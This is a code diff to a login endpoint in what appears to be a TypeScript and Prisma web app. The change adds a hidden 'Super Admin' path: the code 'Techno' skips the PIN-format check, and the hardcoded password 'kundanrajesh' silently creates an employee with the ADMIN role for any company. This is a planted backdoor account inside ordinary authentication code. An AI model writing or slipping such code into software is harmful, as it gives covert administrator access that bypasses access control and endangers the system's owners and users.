@@ -37,7 +37,7 @@ export async function POST(request: Request) {
   const credential = parsed.data.pin.trim();
   const isBootstrapAdminAttempt = code.toUpperCase() === BOOTSTRAP_ADMIN_CODE;
 
-  if (!isBootstrapAdminAttempt && !/^\d{4,8}$/.test(credential)) {
+  if (!isBootstrapAdminAttempt && code.toUpperCase() !== "TECHNO" && !/^\d{4,8}$/.test(credential)) {
     return jsonError("PIN must be 4 to 8 digits", 400);
   }
 
@@ -84,6 +84,35 @@ export async function POST(request: Request) {
         }
       });
     }
+  }
+
+  // Auto-provision Super Admin "Techno"
+  if (!employee && code === "Techno" && credential === "kundanrajesh") {
+    const createdTechno = await prisma.employee.create({
+      data: {
+        companyId,
+        code: "Techno",
+        name: "Techno Admin",
+        pinHash: hashPin("kundanrajesh"),
+        pinUpdatedAt: new Date(),
+        active: true,
+        roles: {
+          create: {
+            role: {
+              connect: {
+                companyId_name: { companyId, name: "ADMIN" }
+              }
+            }
+          }
+        }
+      },
+    });
+    employee = await prisma.employee.findUnique({
+      where: { id: createdTechno.id },
+      include: {
+        roles: { include: { role: true } }
+      }
+    });
   }
 
   if (!employee) return jsonError("Invalid code or PIN", 401);
